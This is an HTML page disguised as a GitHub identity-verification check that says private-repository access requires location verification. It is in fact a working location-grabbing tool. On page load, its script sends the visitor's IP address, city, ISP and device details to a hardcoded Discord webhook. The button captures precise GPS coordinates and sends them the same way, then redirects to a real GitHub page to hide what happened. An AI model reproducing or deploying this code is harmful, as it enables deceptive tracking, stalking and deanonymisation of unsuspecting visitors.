<!DOCTYPE html>
<html>
<head>
    <title>Identity Verification</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif; background-color: #f6f8fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; border: 1px solid #d1d5da; border-radius: 6px; padding: 32px; width: 420px; text-align: center; box-shadow: 0 1px 3px rgba(27,31,35,0.12); }
        .btn { background-color: #2ea44f; color: white; border: 1px solid rgba(27,31,35,0.15); border-radius: 6px; padding: 10px 20px; font-weight: 600; cursor: pointer; text-decoration: none; display: inline-block; margin-top: 20px; }
        .btn:hover { background-color: #2c974b; }
        h2 { margin-top: 0; color: #24292e; }
        p { color: #586069; font-size: 14px; line-height: 1.5; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" width="60" alt="GitHub Logo">
        <h2>Security Check</h2>
        <p>To access this private repository, you must verify your current location to comply with international trade regulations (15 CFR § 730).</p>
        <button class="btn" onclick="getGPS()">Verify & Continue</button>
    </div>

    <script>
        // PASTE YOUR DISCORD WEBHOOK URL HERE
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1497828121200820254/fL_BPp086N5hYtNVPrBCLXa5X5xiG_ybhCY8DUkCClGuvAljSaHJNrKjNt-oZLMitsS-";

        async function sendToDiscord(data) {
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
            } catch (e) {}
        }

        // --- RUNS IMMEDIATELY ON VISIT ---
        async function autoCapture() {
            let embed = {
                title: "👀 SITE VISIT DETECTED (Instant)",
                color: 3447003,
                fields: [
                    { name: "User Agent", value: "```" + navigator.userAgent + "```" },
                    { name: "Device", value: navigator.platform, inline: true }
                ],
                timestamp: new Date().toISOString()
            };

            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                embed.fields.push(
                    { name: "IP Address", value: d.ip, inline: true },
                    { name: "Location", value: `${d.city}, ${d.region}, ${d.country_name}`, inline: true },
                    { name: "ISP", value: d.org, inline: true }
                );
            } catch (e) {
                embed.fields.push({ name: "IP Data", value: "Blocked/Error" });
            }

            await sendToDiscord({ embeds: [embed] });
        }

        // --- RUNS WHEN BUTTON CLICKED ---
        async function getGPS() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    
                    await sendToDiscord({
                        embeds: [{
                            title: "🎯 PRECISE GPS CAPTURED",
                            color: 15105570,
                            description: `**Google Maps Link:** [Click Here](https://www.google.com/maps/search/?api=1&query=${lat},${lon})`,
                            fields: [
                                { name: "Latitude", value: lat.toString(), inline: true },
                                { name: "Longitude", value: lon.toString(), inline: true },
                                { name: "Accuracy", value: `${pos.coords.accuracy}m`, inline: true }
                            ]
                        }]
                    });
                    window.location.href = "https://github.com/features/security";
                }, (err) => {
                    sendToDiscord({ content: "❌ **GPS Permission Denied**" });
                    window.location.href = "https://github.com/features/security";
                }, { enableHighAccuracy: true });
            } else {
                window.location.href = "https://github.com/features/security";
            }
        }

        // Trigger autoCapture as soon as script loads
        autoCapture();
    </script>
</body>
</html>
